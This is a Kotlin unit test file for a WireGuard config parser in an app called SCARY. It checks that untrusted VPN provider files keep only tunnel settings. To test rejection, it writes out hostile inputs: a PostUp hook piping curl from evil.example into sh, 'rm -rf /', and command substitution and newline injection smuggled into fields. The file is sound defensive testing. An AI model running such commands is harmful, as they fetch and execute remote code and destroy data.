// SPDX-License-Identifier: Apache-2.0
// Powered by SCARY · Open source · https://github.com/diamondrubinny/Scary
// Copyright 2026 diamondrubinny. See the LICENSE and NOTICE files.

package io.github.diamondrubinny.scary.core

import io.github.diamondrubinny.scary.core.vpn.WireGuardConfig
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/** A VPN provider's WireGuard file, read as untrusted text: only a tunnel's settings survive, and nothing is run. */
class WireGuardConfigTest {
    // Made-up keys of the right shape (32 bytes in base64); no real tunnel has them.
    private val private = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE="
    private val public = "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI="
    private val good = """
        [Interface]
        # from the provider's site
        PrivateKey = $private
        Address = 10.2.0.2/32, fd00::2/128
        DNS = 10.2.0.1

        [Peer]
        PublicKey = $public
        AllowedIPs = 0.0.0.0/0, ::/0
        Endpoint = vpn.example.net:51820
        PersistentKeepalive = 25
    """.trimIndent()

    @Test
    fun `a provider's file is kept as its settings and summed up without its keys`() {
        val parsed = WireGuardConfig.parse(good)!!
        assertEquals(listOf("vpn.example.net:51820"), parsed.summary.endpoints)
        assertEquals(listOf("10.2.0.2/32", "fd00::2/128"), parsed.summary.addresses)
        assertEquals(listOf("10.2.0.1"), parsed.summary.dns)
        assertFalse(parsed.summary.toString().contains(private))
        assertEquals(
            "[Interface]\nPrivateKey = $private\nAddress = 10.2.0.2/32, fd00::2/128\nDNS = 10.2.0.1\n\n" +
                "[Peer]\nPublicKey = $public\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = vpn.example.net:51820\nPersistentKeepalive = 25\n",
            parsed.text,
        )
        // Read again, it is the same file.
        assertEquals(parsed, WireGuardConfig.parse(parsed.text))
    }

    @Test
    fun `what runs commands or is unknown is dropped, never kept`() {
        val hooked = good.replace("DNS = 10.2.0.1", "DNS = 10.2.0.1\nPostUp = curl https://evil.example/x | sh\nPreDown = rm -rf /\nSaveConfig = true\nTable = off\nIncludedApplications = com.other.app\nListenPort = 1234\nNovelty = 7")
        val parsed = WireGuardConfig.parse(hooked)!!
        assertEquals(WireGuardConfig.parse(good)!!.text, parsed.text)
        for (word in listOf("PostUp", "PreDown", "curl", "SaveConfig", "Table", "com.other.app", "Novelty")) assertFalse(word, parsed.text.contains(word))
    }

    @Test
    fun `which app goes through the tunnel is SCARY's to say`() {
        val text = WireGuardConfig.parse(good)!!.forApp("io.github.diamondrubinny.scary")
        assertTrue(text.startsWith("[Interface]\nIncludedApplications = io.github.diamondrubinny.scary\nPrivateKey = "))
        assertEquals(1, Regex("IncludedApplications").findAll(text).count())
        assertTrue(runCatching { WireGuardConfig.parse(good)!!.forApp("a b\nPostUp = x") }.isFailure)
    }

    @Test
    fun `a file that is not a usable tunnel is refused`() {
        assertNull(WireGuardConfig.parse(""))
        assertNull(WireGuardConfig.parse("client\ndev tun\nproto udp\nremote vpn.example.net 1194"))
        assertNull(WireGuardConfig.parse(good.replace(private, "short")))
        assertNull(WireGuardConfig.parse(good.replace(public, public.dropLast(1) + "!")))
        assertNull(WireGuardConfig.parse(good.replace("Endpoint = vpn.example.net:51820", "Endpoint = vpn.example.net")))
        assertNull(WireGuardConfig.parse(good.replace("vpn.example.net:51820", "vpn.example.net:70000")))
        assertNull(WireGuardConfig.parse(good.replace("vpn.example.net:51820", "vpn.exa mple.net:51820")))
        assertNull(WireGuardConfig.parse(good.replace("vpn.example.net:51820", "\$(reboot):51820")))
        assertNull(WireGuardConfig.parse(good.replace("Address = 10.2.0.2/32, fd00::2/128", "Address = not-an-address")))
        assertNull(WireGuardConfig.parse(good.substringBefore("[Peer]")))
        assertNull(WireGuardConfig.parse(good + "\n[Interface]\nPrivateKey = $private\n"))
        assertNull(WireGuardConfig.parse(good.replace("[Peer]", "[Script]")))
        assertNull(WireGuardConfig.parse(good.replace("PersistentKeepalive = 25", "PersistentKeepalive = 25\nEndpoint = other.example:1")))
        assertNull(WireGuardConfig.parse(good + "\u0007"))
        assertNull(WireGuardConfig.parse(good + "\n#" + "x".repeat(WireGuardConfig.MAX_CHARS)))
        assertNull(WireGuardConfig.parse("PrivateKey = $private\n" + good))
        assertNull(WireGuardConfig.parse(good + (1..9).joinToString("") { "\n[Peer]\nPublicKey = $public\nEndpoint = h$it.example:1\n" }))
    }

    @Test
    fun `an address in brackets and settings on several lines are read`() {
        val parsed = WireGuardConfig.parse(
            good.replace("Endpoint = vpn.example.net:51820", "Endpoint = [2001:db8::1]:51820")
                .replace("Address = 10.2.0.2/32, fd00::2/128", "Address = 10.2.0.2/32\nAddress = fd00::2/128"),
        )!!
        assertEquals(listOf("[2001:db8::1]:51820"), parsed.summary.endpoints)
        assertEquals(listOf("10.2.0.2/32", "fd00::2/128"), parsed.summary.addresses)
    }
}
